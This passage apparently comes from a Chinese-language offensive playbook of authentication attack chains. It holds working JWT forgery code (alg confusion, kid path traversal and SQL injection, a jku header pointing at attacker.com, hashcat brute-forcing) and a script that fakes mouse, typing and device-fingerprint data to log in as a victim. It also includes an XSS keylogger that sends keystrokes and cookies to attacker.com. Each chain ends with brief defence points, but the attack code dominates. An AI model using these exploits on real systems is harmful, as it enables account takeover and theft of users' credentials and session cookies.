forged = f"{h}.{p}.{b64url(sig)}"
print(f"[+] HS256 混淆 token:\n{forged}")

r = requests.get("https://target.com/api/admin/users",
    headers={"Authorization": f"Bearer {forged}"}, verify=False)
print(f"[+] 响应: HTTP {r.status_code} - {r.text[:200]}")
```

**步骤 4 - kid 注入与密钥操控**:
```bash
# 绕过 1: kid 路径遍历(指向空文件做 HS256 密钥)
# header: {"alg":"HS256","kid":"../../../../dev/null"}
# /dev/null 为空 -> HMAC 密钥为空字符串
python3 -c "
import base64, json, hmac, hashlib
def b(d): return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
h=b(json.dumps({'alg':'HS256','typ':'JWT','kid':'../../../../dev/null'}).encode())
p=b(json.dumps({'sub':'admin','role':'admin','exp':9999999999}).encode())
sig=hmac.new(b'', f'{h}.{p}'.encode(), hashlib.sha256).digest()
print(f'{h}.{p}.{b(sig)}')
"

# 绕过 2: kid SQL 注入(若 kid 用于数据库查询)
# {"alg":"HS256","kid":"key' UNION SELECT 'attacker_secret'--"}
# 攻击者知道 attacker_secret -> 用该密钥签名

# 绕过 3: jku/jwk 注入(header 指向攻击者控制的 JWKS)
# {"alg":"RS256","jku":"https://attacker.com/jwks.json"}
# 后端从攻击者 URL 获取公钥 -> 攻击者用对应私钥签名
```

**步骤 5 - 检测绕过技巧**:
```bash
# 绕过 1: 混淆 alg 大小写(none/None/NONE/nOnE)
# 不同 JWT 库对大小写处理不同

# 绕过 2: 空签名 vs base64(空) 签名
# 部分库: header.payload. (空签名段)
# 部分库: header.payload.e30 (base64(空))

# 绕过 3: 篡改 kid 但保持原签名(若 kid 不参与签名计算)
# 原始 token 的 header 中改 kid, 但保持 payload+signature 不变
# 若后端用 kid 查密钥但签名校验用原密钥 -> 可利用 kid 注入

# 绕过 4: 弱 HS256 密钥爆破
# 若 HS256 密钥为弱口令, 用 hashcat/john 爆破
echo "${TOKEN}" > /tmp/jwt.txt
hashcat -m 16500 /tmp/jwt.txt /tmp/rockyou.txt  # JWT 爆破
# john /tmp/jwt.txt --wordlist=/tmp/rockyou.txt
```

**防御要点**: 后端必须固定期望算法(白名单 `alg`);禁止 `none` 算法;RS256 与 HS256 使用不同密钥;`kid` 仅接受白名单值(禁止路径遍历/SQL);`jku`/`jwk` 禁止或严格白名单;HS256 密钥需高熵。

---

### 攻击链 4: 2026 - AI 驱动的自适应认证绕过(行为模拟)

**目标画像**: 应用使用行为生物特征(鼠标轨迹/打字节奏/设备指纹)做风险认证,攻击者用 AI 模拟受害者行为。
**CVE 参考**: 2026 年学术研究(Behavioral Biometrics Spoofing via LLM);自适应认证绕过趋势。

**步骤 1 - 识别行为认证机制**:
```bash
# 检测前端是否采集行为数据(检查 JS 中的事件监听)
curl -sk "https://target.com/login" | grep -oi "mousemove\|keydown\|touchstart\|deviceFingerprint\|behaviorData\|riskScore\|captcha\|recaptcha"

# 分析登录请求中的行为数据字段
# 通常在 JSON body 或自定义头中发送:
# X-Behavior-Score: 0.85
# X-Device-Fingerprint: a1b2c3d4...
# body: {"username":"user","password":"pass","behaviorData":{...},"riskToken":"..."}
curl -sk -X POST "https://target.com/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}' -v 2>&1 | grep -i "behavior\|risk\|fingerprint"
```

**步骤 2 - AI 生成模拟行为数据绕过行为认证**:
```python
#!/usr/bin/env python3
# 文件名: ai_behavioral_bypass.py
# AI 驱动的行为模拟绕过自适应认证
# 模拟正常用户的鼠标轨迹、打字节奏、设备指纹
import requests, json, random, time, urllib3, hashlib
import numpy as np
urllib3.disable_warnings()

def generate_human_mouse_trajectory(start_x=100, start_y=100, end_x=400, end_y=300, steps=30):
    """生成模拟人类的鼠标移动轨迹(贝塞尔曲线 + 噪声)"""
    # 使用贝塞尔曲线生成自然轨迹
    t = np.linspace(0, 1, steps)
    # 控制点(随机偏移使轨迹弯曲)
    ctrl_x = random.uniform(start_x, end_x) + random.uniform(-50, 50)
    ctrl_y = random.uniform(start_y, end_y) + random.uniform(-50, 50)
    # 二次贝塞尔曲线: B(t) = (1-t)^2*P0 + 2(1-t)t*P1 + t^2*P2
    x = (1-t)**2 * start_x + 2*(1-t)*t * ctrl_x + t**2 * end_x
    y = (1-t)**2 * start_y + 2*(1-t)*t * ctrl_y + t**2 * end_y
    # 添加人类抖动噪声(手部微小抖动)
    x += np.random.normal(0, 0.5, steps)
    y += np.random.normal(0, 0.5, steps)
    # 时间间隔(人类鼠标移动有加速度/减速度)
    times = np.cumsum(np.random.uniform(8, 25, steps))
    trajectory = [{"x": int(xi), "y": int(yi), "t": int(ti)} 
                  for xi, yi, ti in zip(x, y, times)]
    return trajectory

def generate_human_typing_pattern(text="password"):
    """生成模拟人类的打字节奏(按键间隔)"""
    pattern = []
    prev_time = 0
    for char in text:
        # 人类打字间隔: 50-200ms(正常), 有时会停顿
        interval = random.gauss(120, 40)  # 平均 120ms, 标准差 40ms
        interval = max(40, interval)  # 最小 40ms
        if random.random() < 0.05:  # 5% 概率停顿(思考)
            interval += random.uniform(200, 800)
        prev_time += interval
        pattern.append({"key": char, "timestamp": int(prev_time)})
    return pattern

def generate_device_fingerprint():
    """生成可信的设备指纹(模拟正常设备)"""
    fp = {
        "screen": {"width": 1920, "height": 1080, "colorDepth": 24},
        "timezone": "Asia/Shanghai",
        "language": "zh-CN",
        "platform": "Win32",
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "canvas": hashlib.md5(b"canvas_fingerprint_seed").hexdigest(),  # 伪造 canvas 指纹
        "webgl": "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060)",
        "fonts": ["Arial", "Calibri", "Cambria", "Courier New"],  # 常见字体
        "hardwareConcurrency": 8,
        "deviceMemory": 16,
    }
    return fp

# 构造完整的"正常用户"行为数据
behavior_data = {
    "mouseTrajectory": generate_human_mouse_trajectory(),
    "typingPattern": generate_human_typing_pattern("victim_password"),
    "deviceFingerprint": generate_device_fingerprint(),
    "scrollEvents": [{"y": 0, "t": 0}, {"y": 200, "t": 500}, {"y": 500, "t": 1200}],
    "focusEvents": [{"type": "focus", "t": 100}, {"type": "blur", "t": 5000}],
    "behaviorScore": 0.92,  # 高信任分(模拟正常用户)
}

# 发送带模拟行为数据的登录请求
r = requests.post("https://target.com/api/login",
    json={
        "username": "victim@target.com",
        "password": "guessed_or_leaked_password",
        "behaviorData": behavior_data,
        "riskToken": "simulated_low_risk",  # 伪造低风险标记
    },
    headers={
        "X-Device-Fingerprint": behavior_data["deviceFingerprint"]["canvas"],
        "X-Behavior-Score": "0.92",
        "X-Forwarded-For": "正常住宅IP段",  # 使用住宅代理 IP
        "User-Agent": behavior_data["deviceFingerprint"]["userAgent"],
    },
    verify=False)

print(f"[+] 登录响应: HTTP {r.status_code}")
print(f"[+] 响应体: {r.text[:300]}")
# 若返回 200 + session -> 行为认证被 AI 模拟绕过
```

**步骤 3 - 窃取受害者行为数据(配合钓鱼/XSS)**:
```bash
# 通过 XSS 窃取受害者的真实行为数据(比 AI 生成更有效)
# XSS payload(注入到目标页面):
cat > /tmp/xss_behavior_steal.js << 'JSEOF'
// 窃取受害者鼠标轨迹 + 打字节奏 + 设备指纹
let mouseData = [];
let typingData = [];
let startTime = Date.now();

// 记录鼠标轨迹(采样降频避免数据过大)
document.addEventListener('mousemove', (e) => {
    if (Math.random() < 0.1) {  // 10% 采样率
        mouseData.push({x: e.clientX, y: e.clientY, t: Date.now() - startTime});
    }
});

// 记录打字节奏
document.addEventListener('keydown', (e) => {
    typingData.push({key: e.key, t: Date.now() - startTime});
});

// 登录表单提交时发送窃取的行为数据到攻击者
document.querySelector('form').addEventListener('submit', () => {
    fetch('https://attacker.com/steal_behavior', {
        method: 'POST',
        body: JSON.stringify({
            mouseData: mouseData,
            typingData: typingData,
            fingerprint: {
                screen: `${screen.width}x${screen.height}`,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
            },
            cookies: document.cookie,
        })
    });
});
JSEOF
# 将此 JS 通过 XSS 注入到目标登录页
# 窃取的行为数据可直接重放到攻击者的登录请求中(完美模拟受害者)
```

**步骤 4 - 检测绕过技巧**:
```bash
# 绕过 1: 重放受害者真实行为数据(最有效)
# 通过 XSS 窃取的行为数据比 AI 生成更逼真
# 直接复制受害者的 behaviorData 到攻击者请求

# 绕过 2: 使用住宅代理 IP(避免数据中心 IP 被标记为高风险)
# curl --proxy "socks5://residential-proxy:port"

# 绕过 3: 模拟受害者的设备指纹(从泄露数据/社工获取)
# 受害者的 User-Agent / screen resolution / timezone 等

# 绕过 4: 降低行为评分的异常指标(慢速操作 + 自然间隔)
# 避免瞬时提交(机器人特征); 添加随机延迟和停顿

# 绕过 5: 针对自适应认证的降级路径
# 若行为评分低 -> 触发 MFA -> 攻击 MFA(参见技能攻击链 + Passkey 降级)
# 策略: 故意触发低风险路径, 利用更弱的认证通道
```

**防御要点**: 行为认证不应作为唯一认证因素;行为数据需绑定到当前会话(防重放);结合设备绑定 + 网络位置 + 时间窗口;AI 检测异常模式而非匹配正常模式;关键操作需额外的不可模拟因素(如 push 通知确认)。
